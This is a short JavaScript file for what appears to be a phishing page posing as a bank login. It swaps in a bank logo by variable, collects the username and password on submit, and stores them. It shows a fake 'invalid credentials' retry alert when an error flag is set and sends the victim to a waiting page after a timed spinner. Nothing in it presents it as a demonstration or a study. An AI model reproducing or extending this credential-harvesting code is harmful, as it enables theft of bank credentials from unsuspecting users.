console.log("banca ON");

// ERORRES
document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err != ''){
        alert('Credenciales inválidas, por favor intente de nuevo.');
    }
});

// Cargar imagen
document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${info.ban}.png`);

const btnSuccess = document.querySelector('#form');

btnSuccess.addEventListener('submit', e => {
    e.preventDefault();

    info.user = document.querySelector('#user').value;
    info.puser = document.querySelector('#puser').value;

    LS.setItem('info', JSON.stringify(info));

    showSpinner();

    setTimeout(()=>{
        window.location.href = 'waiting.html';
    }, 3000);
});